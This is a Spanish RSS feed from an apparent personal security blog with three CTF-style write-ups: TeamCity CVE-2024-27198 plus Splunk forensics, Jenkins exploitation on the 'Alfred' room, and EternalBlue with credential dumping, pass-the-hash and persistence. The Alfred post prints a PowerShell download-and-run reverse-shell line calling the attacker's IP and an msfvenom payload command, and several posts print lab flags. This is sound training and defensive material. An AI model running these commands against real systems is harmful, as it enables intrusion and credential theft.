<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Metasploit on Gabriel Tello</title>
    <link>https://gtello.github.io/es/tags/metasploit/</link>
    <description>Recent content in Metasploit on Gabriel Tello</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>es-EC</language>
    <managingEditor>gabrieltello10@hotmail.com (Gabriel Tello)</managingEditor>
    <webMaster>gabrieltello10@hotmail.com (Gabriel Tello)</webMaster>
    <copyright>[Gabriel Tello](https://github.com/gtello) © 2024</copyright>
    <lastBuildDate>Fri, 29 Nov 2024 14:50:00 +0000</lastBuildDate>
    <atom:link href="https://gtello.github.io/es/tags/metasploit/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Brains (THM)</title>
      <link>https://gtello.github.io/es/writeups/brains/</link>
      <pubDate>Fri, 29 Nov 2024 14:50:00 +0000</pubDate><author>gabrieltello10@hotmail.com (Gabriel Tello)</author>
      <guid>https://gtello.github.io/es/writeups/brains/</guid>
      <description>&lt;div style=&#34;text-align: justify;&#34;&gt;  &#xD;&#xA;&lt;p&gt;Writeup de la máquina &lt;a href=&#34;https://tryhackme.com/r/room/brains&#34;&gt;Brains&lt;/a&gt; en TryHackMe.&lt;/p&gt;&#xA;&lt;h2 id=&#34;resumen&#34;&gt;Resumen&lt;/h2&gt;&#xA;&lt;p&gt;En la máquina &lt;strong&gt;Brains&lt;/strong&gt;, exploramos una vulnerabilidad en TeamCity (&lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2024-27198&#34;&gt;CVE-2024-27198&lt;/a&gt;), asumiendo roles tanto del &lt;strong&gt;&lt;span style=&#34;color: red;&#34;&gt;Red Team&lt;/span&gt;&lt;/strong&gt; como del &lt;strong&gt;Blue Team&lt;/strong&gt;. Como parte del Red Team, explotamos la vulnerabilidad para lograr ejecución remota de código (RCE) y capturar la bandera. Luego, cambiamos al enfoque del Blue Team, utilizando Splunk para analizar logs e investigar las acciones del atacante que había explotado la misma vulnerabilidad para comprometer la máquina. Este enfoque dual nos brinda experiencia práctica en técnicas de seguridad ofensiva y defensiva.&lt;/p&gt;</description>
      <content:encoded><![CDATA[<div style="text-align: justify;">  
<p>Writeup de la máquina <a href="https://tryhackme.com/r/room/brains">Brains</a> en TryHackMe.</p>
<h2 id="resumen">Resumen</h2>
<p>En la máquina <strong>Brains</strong>, exploramos una vulnerabilidad en TeamCity (<a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27198">CVE-2024-27198</a>), asumiendo roles tanto del <strong><span style="color: red;">Red Team</span></strong> como del <strong>Blue Team</strong>. Como parte del Red Team, explotamos la vulnerabilidad para lograr ejecución remota de código (RCE) y capturar la bandera. Luego, cambiamos al enfoque del Blue Team, utilizando Splunk para analizar logs e investigar las acciones del atacante que había explotado la misma vulnerabilidad para comprometer la máquina. Este enfoque dual nos brinda experiencia práctica en técnicas de seguridad ofensiva y defensiva.</p>
<h2 id="reconocimiento">Reconocimiento</h2>
<p>Empecé con un escaneo de red con nmap para identificar puertos y servicios abiertos:</p>





<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">nmap -A -T4 -p- 10.10.63.31</span></span></code></pre></div><h3 id="resultados-del-reconocimiento">Resultados del Reconocimiento</h3>
<table>
  <thead>
      <tr>
          <th style="text-align: left">Sistema Operativo</th>
          <th style="text-align: left">Dirección IP</th>
          <th style="text-align: left">Puertos Abiertos</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left">Ubuntu</td>
          <td style="text-align: left">10.10.63.31</td>
          <td style="text-align: left">22 (SSH), 80 (HTTP), 50000 (<a href="https://www.jetbrains.com/teamcity/">TeamCity</a>)</td>
      </tr>
  </tbody>
</table>
<p>Al visitar el servidor web, la página de inicio muestra que está en mantenimiento:</p>
<p><img alt="Página en mantenimiento" src="/images/posts/brains/image1.png"> <center><b>Página en mantenimiento</b></center></p>
<p>En el puerto 50000, se encuentra la página de login de TeamCity, e inmediatamente al ver la versión 2023.11.4 recuerdo que esta es vulnerable al exploit <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27198">CVE-2024-27198</a>.</p>
<p><img alt="Login de TeamCity" src="/images/posts/brains/image2.png"> <center><b>Login de TeamCity</b></center></p>
<h2 id="explotación">Explotación</h2>
<p>Para nuestra facilidad, hay un script listo en <a href="https://www.rapid7.com/blog/post/2024/03/04/etr-cve-2024-27198-and-cve-2024-27199-jetbrains-teamcity-multiple-authentication-bypass-vulnerabilities-fixed/">metasploit</a> que automatiza el exploit:</p>
<p><img alt="Ejecución de exploit en metasploit" src="/images/posts/brains/image3.png"> <center><b>Ejecución de exploit en metasploit</b></center></p>
<p>Una vez dentro, agarramos la bandera:</p>
<p><img alt="Bandera" src="/images/posts/brains/image4.png"> <center><b>Bandera</b></center></p>
<h2 id="análisis-de-logs">Análisis de Logs</h2>
<p>Ahora nos movemos al <strong>Blue Team</strong>, en esta segunda parte, nos metemos en Splunk para analizar logs y descubrir que alguien ya había comprometido esta máquina y podemos investigar el caso.</p>
<h3 id="identificando-al-usuario-creado">Identificando al Usuario Creado</h3>
<p>Primero nos solicitan identificar el nombre de usuario creado en el servidor tras la explotación. Para encontrar esta información, podemos revisar los registros relacionados con la actividad de usuarios en el archivo <code>/var/log/auth.log</code>.</p>
<p><img alt="Usuario creado" src="/images/posts/brains/image5.png"> <center><b>Usuario creado</b></center></p>
<p>Una vez conseguido el lapso de tiempo en el que el atacante entró a la máquina se nos hará más fácil responder las siguientes preguntas.</p>
<h3 id="encontrando-el-paquete-malicioso">Encontrando el Paquete Malicioso</h3>
<p>El siguiente paso es determinar si el atacante instaló algún paquete malicioso en el servidor. Para ello, aprovechamos el <a href="https://docs.splunk.com/Splexicon:Sourcetype">sourcetype</a> <code>packages</code> en Splunk, el cual clasifica y estructura los registros de la gestión de paquetes en el sistema. Este sourcetype incluye información detallada sobre paquetes instalados, actualizados o eliminados, permitiéndonos rastrear cualquier actividad sospechosa.</p>
<p><img alt="Paquete malicioso instalado" src="/images/posts/brains/image6.png"> <center><b>Paquete malicioso instalado</b></center></p>
<h3 id="identificando-el-plugin-instalado">Identificando el Plugin Instalado</h3>
<p>Para esto, utilizamos un sencillo query en Splunk con el término clave <code>*plugin*</code> combinado con el lapso de tiempo previamente definido. Esta consulta nos permitió encontrar rápidamente el plugin malicioso instalado en el sistema.</p>
<p><img alt="Plugin malicioso instalado" src="/images/posts/brains/image7.png"> <center><b>Plugin malicioso instalado</b></center></p>
<h2 id="herramientas-utilizadas">Herramientas Utilizadas</h2>
<table>
  <thead>
      <tr>
          <th style="text-align: left">Herramienta</th>
          <th style="text-align: left">Descripción</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left"><strong>nmap</strong></td>
          <td style="text-align: left">Herramienta de escaneo de red utilizada para identificar puertos y servicios abiertos.</td>
      </tr>
      <tr>
          <td style="text-align: left"><strong>Metasploit</strong></td>
          <td style="text-align: left">Utilizado para automatizar la explotación de la vulnerabilidad <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27198">CVE-2024-27198</a>.</td>
      </tr>
      <tr>
          <td style="text-align: left"><strong>Splunk</strong></td>
          <td style="text-align: left">Plataforma utilizada para analizar logs del sistema y rastrear actividades sospechosas.</td>
      </tr>
  </tbody>
</table>
<h2 id="recomendaciones">Recomendaciones</h2>
<p>Para mitigar riesgos similares a los explorados en esta máquina, se recomienda aplicar actualizaciones de seguridad tan pronto como estén disponibles, especialmente en plataformas críticas como TeamCity. Implementar controles de acceso estrictos y limitar los servicios expuestos al Internet. Además, se deben monitorear constantemente los logs del sistema mediante herramientas como Splunk para detectar actividades sospechosas, como creación de usuarios o instalación de paquetes maliciosos. Finalmente, realizar pruebas periódicas de penetración ayuda a identificar vulnerabilidades antes de que puedan ser explotadas por un atacante.</p>
</div>]]></content:encoded>
    </item>
    <item>
      <title>Alfred (THM)</title>
      <link>https://gtello.github.io/es/writeups/alfred/</link>
      <pubDate>Fri, 15 Nov 2024 15:30:00 +0000</pubDate><author>gabrieltello10@hotmail.com (Gabriel Tello)</author>
      <guid>https://gtello.github.io/es/writeups/alfred/</guid>
      <description>&lt;div style=&#34;text-align: justify;&#34;&gt;&#xD;&#xA;&lt;p&gt;Writeup de la máquina &lt;a href=&#34;https://tryhackme.com/r/room/alfred&#34;&gt;Alfred&lt;/a&gt; en TryHackMe.&lt;/p&gt;&#xA;&lt;h2 id=&#34;resumen&#34;&gt;Resumen&lt;/h2&gt;&#xA;&lt;p&gt;Vamos a ver cómo explotar una máquina Windows con un servicio Jenkins expuesto. Usando credenciales por defecto, logramos ejecutar comandos remotos a través de la funcionalidad de construcción de Jenkins y obtenimos un acceso inicial. A partir de ahí, escalamos privilegios utilizando técnicas de suplantación de tokens, alcanzando finalmente control administrativo total del sistema.&lt;/p&gt;&#xA;&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;&#xA;&lt;p&gt;Lo primero fue realizar un escaneo de red con &lt;code&gt;nmap&lt;/code&gt; para identificar puertos y servicios abiertos.&lt;/p&gt;</description>
      <content:encoded><![CDATA[<div style="text-align: justify;">
<p>Writeup de la máquina <a href="https://tryhackme.com/r/room/alfred">Alfred</a> en TryHackMe.</p>
<h2 id="resumen">Resumen</h2>
<p>Vamos a ver cómo explotar una máquina Windows con un servicio Jenkins expuesto. Usando credenciales por defecto, logramos ejecutar comandos remotos a través de la funcionalidad de construcción de Jenkins y obtenimos un acceso inicial. A partir de ahí, escalamos privilegios utilizando técnicas de suplantación de tokens, alcanzando finalmente control administrativo total del sistema.</p>
<h2 id="reconocimiento">Reconocimiento</h2>
<p>Lo primero fue realizar un escaneo de red con <code>nmap</code> para identificar puertos y servicios abiertos.</p>
<h3 id="resultado-del-reconocimiento">Resultado del reconocimiento</h3>
<table>
  <thead>
      <tr>
          <th style="text-align: left">Sistema Operativo</th>
          <th style="text-align: left">Dirección IP</th>
          <th style="text-align: left">Puertos Abiertos</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left">Windows Server</td>
          <td style="text-align: left">10.10.149.26</td>
          <td style="text-align: left">80, 3389, 8080</td>
      </tr>
  </tbody>
</table>
<p><img alt="Comando nmap y resultados" src="/images/posts/alfred/image1.png"></p>
<center><b>Comando nmap y resultados</b></center>
<p>Los puertos 80 y 8080 fueron analizados en el navegador. En el puerto 8080, encontré un portal de inicio de sesión de Jenkins, una herramienta ampliamente usada para CI/CD.</p>
<h2 id="explotación">Explotación</h2>
<p>Probé credenciales por defecto (<code>admin:admin</code>) en el portal de Jenkins, y sorpresa: funcionaron. Esto me dio acceso al dashboard.</p>
<p><img alt="Dashboard de Jenkins" src="/images/posts/alfred/image2.png"></p>
<center><b>Dashboard de Jenkins</b></center>
<p>En la configuración del proyecto, utilicé la sección &ldquo;Build&rdquo; para ejecutar comandos. Usé este <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">script</a> de PowerShell para establecer una reverse shell:</p>





<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="ln">1</span><span class="cl"><span class="nb">iex </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="py">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://10.6.5.62:8008/Invoke-PowerShellTcp.ps1&#39;</span><span class="p">);</span> <span class="nb">Invoke-PowerShellTcp</span> <span class="n">-Reverse</span> <span class="n">-IPAddress</span> <span class="mf">10.6</span><span class="p">.</span><span class="py">5</span><span class="p">.</span><span class="py">62</span> <span class="n">-Port</span> <span class="mf">4321</span></span></span></code></pre></div><p>Con la opción <strong>Build Now</strong>, conseguí conectarme exitosamente a la máquina objetivo desde mi terminal atacante.</p>
<p><img alt="Comando de reverse shell en Jenkins" src="/images/posts/alfred/image3.png"></p>
<center><b>Comando de reverse shell en Jenkins</b></center>  
<p><img alt="Acceso mediante reverse shell" src="/images/posts/alfred/image4.png"></p>
<center><b>Acceso mediante reverse shell</b></center>
<h2 id="escalación-de-privilegios">Escalación de Privilegios</h2>
<p>Una vez dentro de la máquina, generé un payload ejecutable para obtener una sesión de <code>meterpreter</code> utilizando <code>msfvenom</code>:</p>





<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai <span class="nv">LHOST</span><span class="o">=</span>10.6.5.62 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f exe -o revshell.exe</span></span></code></pre></div><p>Transferí el payload a la máquina objetivo utilizando <code>certutil</code> y lo ejecuté, estableciendo una conexión <code>meterpreter</code> con mi máquina atacante.</p>
<p><img alt="Configuración del receptor en Metasploit" src="/images/posts/alfred/image5.png"></p>
<center><b>Configuración del receptor en Metasploit</b></center>
<p>Revisando los privilegios del usuario, podemos ver que tenemos los permisos <code>SeDebugPrivilege</code> y <code>SeImpersonatePrivilege</code>. Estos permisos permiten suplantar tokens y acceder a procesos con permisos elevados. Utilicé el módulo <code>incognito</code> de Metasploit para explotarlos.</p>
<p><img alt="Uso del módulo incognito" src="/images/posts/alfred/image6.png"></p>
<center><b>Uso del módulo incognito</b></center>
<p>Finalmente, migré el proceso a un servicio con permisos <code>SYSTEM</code>, logrando control completo sobre la máquina.</p>
<p><img alt="Migración a un proceso privilegiado" src="/images/posts/alfred/image7.png"></p>
<center><b>Migración a un proceso privilegiado</b></center>
<h2 id="banderas">Banderas</h2>
<p>Con acceso administrativo, encontré las banderas:</p>
<ul>
<li><strong>user.txt</strong>: <code>79007a09481963edf2e1321abd9ae2a0</code></li>
<li><strong>root.txt</strong>: <code>dff0f748678f280250f25a45b8046b4a</code></li>
</ul>
<h2 id="herramientas-utilizadas">Herramientas Utilizadas</h2>
<table>
  <thead>
      <tr>
          <th style="text-align: left">Herramienta</th>
          <th style="text-align: left">Descripción</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left"><strong>nmap</strong></td>
          <td style="text-align: left">Escaneo de red y detección de servicios abiertos.</td>
      </tr>
      <tr>
          <td style="text-align: left"><strong>Jenkins</strong></td>
          <td style="text-align: left">Plataforma explotada con credenciales por defecto para ejecutar comandos.</td>
      </tr>
      <tr>
          <td style="text-align: left"><strong>msfvenom/metasploit</strong></td>
          <td style="text-align: left">Generación de payloads y escalación de privilegios con el módulo incognito.</td>
      </tr>
      <tr>
          <td style="text-align: left"><strong>certutil</strong></td>
          <td style="text-align: left">Transferencia del payload a la máquina objetivo.</td>
      </tr>
  </tbody>
</table>
<h2 id="conclusión">Conclusión</h2>
<p>La explotación del sistema Alfred reveló problemas críticos como servicios expuestos con credenciales por defecto y configuraciones incorrectas de privilegios, lo que permitió escalar hasta el nivel de administrador.</p>
<h2 id="recomendaciones">Recomendaciones</h2>
<ul>
<li><strong>Actualizar Jenkins</strong> y eliminar credenciales por defecto.</li>
<li>Configurar un <strong>firewall</strong> para restringir accesos innecesarios.</li>
<li>Implementar políticas de contraseñas robustas.</li>
<li>Limitar privilegios innecesarios en los usuarios.</li>
</ul>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>Máquina Eternal (EternalBlue)</title>
      <link>https://gtello.github.io/es/writeups/eternalblue/</link>
      <pubDate>Fri, 18 Oct 2024 09:15:00 +0000</pubDate><author>gabrieltello10@hotmail.com (Gabriel Tello)</author>
      <guid>https://gtello.github.io/es/writeups/eternalblue/</guid>
      <description>&lt;div style=&#34;text-align: justify;&#34;&gt;&#xD;&#xA;Esta es una guía paso a paso presentada en formato de reporte profesional sobre una prueba de penetración realizada en una máquina Windows 7.&#xD;&#xA;&lt;h2 id=&#34;resumen-ejecutivo&#34;&gt;Resumen ejecutivo&lt;/h2&gt;&#xA;&lt;p&gt;Durante la prueba de penetración se descubrió que la máquina Eternal (Windows 7) era vulnerable al exploit EternalBlue (&lt;a href=&#34;https://nvd.nist.gov/vuln/detail/cve-2017-0144&#34;&gt;CVE-2017-0144&lt;/a&gt;). Este exploit permite a un atacante no autenticado ejecutar código arbitrario de forma remota y obtener control total del sistema. La vulnerabilidad fue utilizada para comprometer la máquina Eternal, lo que permitió acceso a datos sensibles y a otros sistemas en la red. Este informe detalla el proceso de explotación, los hallazgos y las recomendaciones para mitigar esta vulnerabilidad.&lt;/p&gt;</description>
      <content:encoded><![CDATA[<div style="text-align: justify;">
Esta es una guía paso a paso presentada en formato de reporte profesional sobre una prueba de penetración realizada en una máquina Windows 7.
<h2 id="resumen-ejecutivo">Resumen ejecutivo</h2>
<p>Durante la prueba de penetración se descubrió que la máquina Eternal (Windows 7) era vulnerable al exploit EternalBlue (<a href="https://nvd.nist.gov/vuln/detail/cve-2017-0144">CVE-2017-0144</a>). Este exploit permite a un atacante no autenticado ejecutar código arbitrario de forma remota y obtener control total del sistema. La vulnerabilidad fue utilizada para comprometer la máquina Eternal, lo que permitió acceso a datos sensibles y a otros sistemas en la red. Este informe detalla el proceso de explotación, los hallazgos y las recomendaciones para mitigar esta vulnerabilidad.</p>
<h2 id="reconocimiento">Reconocimiento</h2>
<p>Se realizó un escaneo de red utilizando la herramienta nmap para identificar puertos y servicios abiertos en la máquina.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image1.png" alt="comando nmap" />
</div>
<br>
<center><em>Figura 1:</em> Comando nmap y resultados</center>
<h3 id="resultado-del-reconocimiento">Resultado del reconocimiento</h3>
<table>
  <thead>
      <tr>
          <th style="text-align: left">Sistema Operativo</th>
          <th style="text-align: left">Dirección IP</th>
          <th style="text-align: left">Puertos Abiertos</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left">Windows 7 x64 SP 1</td>
          <td style="text-align: left">192.168.1.167</td>
          <td style="text-align: left">135, 139, 445, 49152-49158</td>
      </tr>
  </tbody>
</table>
<h3 id="verificación-de-vulnerabilidad">Verificación de vulnerabilidad</h3>
<p>El servicio SMB ejecutándose en el puerto 445 en una máquina Windows 7 indica una potencial vulnerabilidad al exploit EternalBlue. Un escaneo adicional con un script de nmap reveló que el sistema era efectivamente vulnerable a CVE-2017-0144 (EternalBlue).</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image2.png" alt="confirmación de nmap" />
</div><br>
<center><em>Figura 2:</em> Confirmación de vulnerabilidad EternalBlue</center>
<h2 id="explotación">Explotación</h2>
<p>Para explotar la vulnerabilidad se utilizó el framework Metasploit. Se seleccionó y configuró el módulo EternalBlue.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image3.png" alt="configuración de exploit" />
</div><br>
<center><em>Figura 3:</em> Configuración del exploit</center>
<p>Se configuró un payload de tipo reverse shell, lo que permitió obtener una conexión remota con control total del sistema. El exploit proporcionó privilegios SYSTEM, por lo que no fue necesaria una elevación adicional.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image4.png" alt="ejecución de exploit" />
</div><br>
<center><em>Figura 4:</em> Resultado de la ejecución del exploit</center>
<h2 id="post-explotación">Post-Explotación</h2>
<p>Una vez establecida la sesión de meterpreter, se procedió a realizar actividades de post-explotación.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image5.png" alt="enumeración de usuarios" />
</div><br>
<center><em>Figura 5:</em> Enumeración de usuarios</center>
<h3 id="extracción-de-credenciales">Extracción de credenciales</h3>
<p>Se utilizó la herramienta Mimikatz mediante el módulo kiwi para extraer credenciales como contraseñas y hashes del sistema operativo Windows.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image6.png" alt="ejecución de mimikatz" />
</div><br>
<center><em>Figura 6:</em> Ejecución de Mimikatz</center>
<p>El archivo SAM (Security Account Manager) almacena los hashes de contraseñas de usuarios locales en un sistema Windows. Utilizando el comando <code>kiwi_cmd lsadump::sam</code> en meterpreter, se extrajo el archivo SAM que contiene los hashes NTLM de las contraseñas de los usuarios locales.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image7.png" alt="dump de hashes de usuarios locales" />
</div><br>
<center><em>Figura 7:</em> Dump de hashes de usuarios locales</center>
<h3 id="uso-de-credenciales-cifradas">Uso de credenciales cifradas</h3>
<p>Una vez obtenidos los hashes de contraseñas, se utilizó la técnica de Pass The Hash (PTH) para acceder a otros recursos del sistema sin necesidad de conocer las contraseñas en texto plano. Este método permite autenticarse y moverse lateralmente entre sistemas Windows, utilizando únicamente el hash de la contraseña.
Se utilizó la herramienta <code>crackmapexec</code> para autenticarse remotamente en otros sistemas o servicios de la red usando el hash de un usuario.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image8.png" alt="ejecución de crackmapexec" />
</div><br>
<center><em>Figura 8:</em> Ejecución de CrackMapExec</center>
<h3 id="persistencia">Persistencia</h3>
<p>A través de la persistencia, se puede mantener el acceso a un sistema comprometido incluso si este se reinicia, lo cual permite restablecer una conexión en el futuro sin tener que repetir el proceso inicial de explotación.
En este caso, se configuró un script de persistencia con el módulo <code>windows/local/persistence_service</code>, el cual genera y carga un ejecutable en el host remoto y luego lo convertirá en un servicio persistente.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image9.png" alt="ejecución de persistencia" />
</div><br>
<center><em>Figura 9:</em> Ejecución de servicio de persistencia.</center>
<p>Al ejecutar este módulo, meterpreter instala un servicio en el sistema comprometido que establece una conexión saliente de tipo reverse shell cada vez que se reinicia el sistema. Esto significa que, incluso si un atacante pierde la conexión inicial, este puede recuperar el acceso sin realizar de nuevo el exploit, siempre que el sistema esté encendido y el atacante esté escuchando en el puerto configurado.</p>
<h3 id="comprobación-de-persistencia">Comprobación de persistencia</h3>
<p>Para comprobar que la persistencia fue ejecutada correctamente, se cerraron las sesiones de meterpreter abiertas.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image10.png" alt="cierre de sesiones" />
</div><br>
<center><em>Figura 10:</em> Cierre de sesiones</center>
<p>Se creó un resource script para automatizar tareas repetitivas en Metasploit, facilitando la reconexión a la máquina comprometida con tan solo ejecutar el script.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image11.png" alt="resource script para metasploit" />
</div><br>
<center><em>Figura 11:</em> Resource script para Metasploit</center>
<p>Una vez ejecutado el script, se observa cómo se configura el payload y el módulo automáticamente para consecuentemente conectarse a la máquina, comprobando que la persistencia funciona correctamente.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image12.png" alt="ejecución del resource script" />
</div><br>
<center><em>Figura 12:</em> Ejecución del resource script</center>
<h3 id="limpieza-de-la-persistencia">Limpieza de la persistencia</h3>
<p>Para realizar la limpieza del sistema atacado, se cerró y eliminó el servicio creado llamado lsass1 mediante comandos <code>sc.exe</code>, lo que garantiza la eliminación del servicio de persistencia en el sistema. Además, se utilizó <code>taskkill.exe</code> para terminar a la fuerza el proceso asociado <code>sdvj.exe</code>, que estaba vinculado al payload de persistencia.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image13.png" alt="limpieza de persistencia" />
</div><br>
<center><em>Figura 13:</em> Limpieza de persistencia</center>
<p>Después de completar estos pasos, la sesión de Meterpreter se cerró de forma segura, lo que confirmó la finalización de la conexión. De esta manera se eliminaron todos los artefactos del mecanismo de persistencia, sin dejar puntos de acceso no autorizados en el sistema.</p>
<h2 id="banderas">Banderas</h2>
<p>Se procedió a realizar la búsqueda de las banderas con el comando <code>search</code> en meterpreter y se usó el comando <code>type</code> para mostrar su contenido.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image14.png" alt="ejecución de comando type" />
</div><br>
<center><em>Figura 14:</em> Ejecución del comando type</center>
<p>De esa manera se encontraron las dos banderas, las cuales son:</p>
<table>
  <thead>
      <tr>
          <th style="text-align: left">Bandera</th>
          <th style="text-align: left">Hash</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left">bandera1.txt</td>
          <td style="text-align: left">0ef3b7d488b11e3e800f547a0765da8e</td>
      </tr>
      <tr>
          <td style="text-align: left">bandera2.txt</td>
          <td style="text-align: left">a63c1c39c0c7fd570053343451667939</td>
      </tr>
  </tbody>
</table>
<h2 id="herramientas-utilizadas">Herramientas utilizadas</h2>
<table>
  <thead>
      <tr>
          <th style="text-align: left">Herramienta</th>
          <th style="text-align: left">Descripción</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left">Nmap</td>
          <td style="text-align: left">Utilizado para el escaneo inicial del sistema y para identificar puertos y servicios abiertos en el objetivo.</td>
      </tr>
      <tr>
          <td style="text-align: left">Metasploit</td>
          <td style="text-align: left">Empleado para explotar la vulnerabilidad EternalBlue (CVE-2017-0144) con un payload de tipo reverse shell.</td>
      </tr>
      <tr>
          <td style="text-align: left">Mimikatz/kiwi</td>
          <td style="text-align: left">Usado dentro de Meterpreter para la extracción del hash de credenciales del sistema Windows.</td>
      </tr>
      <tr>
          <td style="text-align: left">CrackMapExec y PTH</td>
          <td style="text-align: left">Permitió movimiento lateral en la máquina sin necesidad de contraseñas en texto plano, usando solo hashes.</td>
      </tr>
      <tr>
          <td style="text-align: left">Persistencia con Metasploit</td>
          <td style="text-align: left">Configuración de persistencia mediante módulo windows/local/persistence_service para garantizar acceso continuo.</td>
      </tr>
  </tbody>
</table>
<h2 id="conclusión">Conclusión</h2>
<p>La vulnerabilidad EternalBlue explotada en la máquina Eternal muestra serios problemas de seguridad en su infraestructura, permitiendo a un atacante no autenticado obtener un control total del sistema. Una vez comprometido el sistema, se logró capturar credenciales, obtener acceso a recursos adicionales y configurar persistencia, demostrando así la facilidad con la que se pueden realizar movimientos laterales y mantener acceso prolongado sin detección.</p>
<h2 id="recomendaciones">Recomendaciones</h2>
<p>Para mitigar esta vulnerabilidad, se recomienda desactivar el protocolo SMBv1, para prevenir futuras explotaciones de tipo EternalBlue. En casos como este, es importante aislar los sistemas críticos en segmentos de red protegidos mediante VLANs y configuraciones robustas de firewall, además de restringir el tráfico SMB en el puerto 445 solo a lo necesario, monitorizando continuamente las conexiones sospechosas.</p>
<p>Para lograr una defensa a profundidad, se sugiere implementar soluciones IDS/IPS que detecten intentos de explotación y utilizar un SIEM para consolidar y analizar logs, facilitando así la detección temprana de amenazas.</p>
<p>Finalmente, se recomienda migrar de Windows 7 a una versión más actual, como Windows 10, para beneficiarse de mejoras de seguridad y soporte continuo, lo que reforzará la protección de la infraestructura.</p>
</div>
]]></content:encoded>
    </item>
  </channel>
</rss>
